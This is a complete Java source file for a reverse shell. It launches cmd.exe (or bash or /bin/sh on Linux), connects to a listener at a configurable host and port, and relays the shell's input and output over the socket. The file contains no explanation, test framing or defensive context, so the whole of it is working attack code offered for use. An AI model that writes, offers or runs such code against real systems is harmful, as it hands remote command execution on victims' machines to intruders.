import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "127.0.0.1"; // Listening server address
        int port = 5000; // Listening port
        String command = "cmd.exe"; // Shell command, on Windows. Use "bash" or "/bin/sh" on Linux.

        try {
            // Start the shell
            Process process = new ProcessBuilder(command).redirectErrorStream(true).start();

            // Connect to the server
            Socket socket = new Socket(host, port);

            // Input/output streams of the process and socket
            InputStream processInput = process.getInputStream();
            InputStream processError = process.getErrorStream();
            InputStream socketInput = socket.getInputStream();
            OutputStream socketOutput = socket.getOutputStream();
            OutputStream processOutput = process.getOutputStream();

            // Thread to read from process and write to socket
            Thread threadProcessToSocket = new Thread(() -> {
                try {
                    transferStream(processInput, socketOutput);
                } catch (Exception e) {
                    // Exception handling
                }
            });

            // Thread to read from socket and write to process
            Thread threadSocketToProcess = new Thread(() -> {
                try {
                    transferStream(socketInput, processOutput);
                } catch (Exception e) {
                    // Exception handling
                }
            });

            // Start the threads
            threadProcessToSocket.start();
            threadSocketToProcess.start();

            // Wait for threads to finish
            threadProcessToSocket.join();
            threadSocketToProcess.join();

            // Close resources
            process.destroy();
            socket.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Transfers data from an InputStream to an OutputStream
     */
    private static void transferStream(InputStream in, OutputStream out) throws Exception {
        byte[] buffer = new byte[1024];
        int len;
        while ((len = in.read(buffer)) != -1) {
            out.write(buffer, 0, len);
            out.flush();
        }
    }
}
